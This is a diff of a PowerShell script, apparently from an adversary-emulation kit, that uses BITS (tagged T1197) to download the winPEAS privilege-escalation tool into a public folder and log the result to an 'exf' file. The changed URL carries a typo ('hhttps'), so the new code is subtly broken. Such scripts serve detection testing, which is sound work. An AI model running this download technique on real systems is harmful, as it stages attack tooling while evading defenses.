@@ -6,8 +6,14 @@ Write-Output "BITS Job : Donwload WINPEAS using Bitsadmin (T1197)"
 Write-Output "==============================================================================="
 #
 $exf_file ="$env:PUBLIC\exf\Bits_WinPEAS.txt"; 
-Start-Process "bitsadmin.exe" -ArgumentList "/transfer DownloadsWinPEAS /download /priority normal https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe $env:PUBLIC\Toolz\winPEASany_ofs.exe" -NoNewWindow -Wait
-if ($LASTEXITCODE -eq 0)
-{
- Write-Output "Added WINPEAS Download to Bits !" | Out-File -FilePath "$exf_file" -Encoding ascii -Append; 
+$DownLoadSource = "hhttps://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+$DestDir = "$env:PUBLIC\Toolz\"
+$DestFile = "winPEASany_ofs.exe"
+$FullDest = $DestDir + $DestFile
+try {
+    Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload_Process" -Description "Downloading a complied file From the Internet" -Priority Foreground
+    Write-Output "Added WinPEAS Download to Bits !" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
+}
+catch {
+    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append    
 }
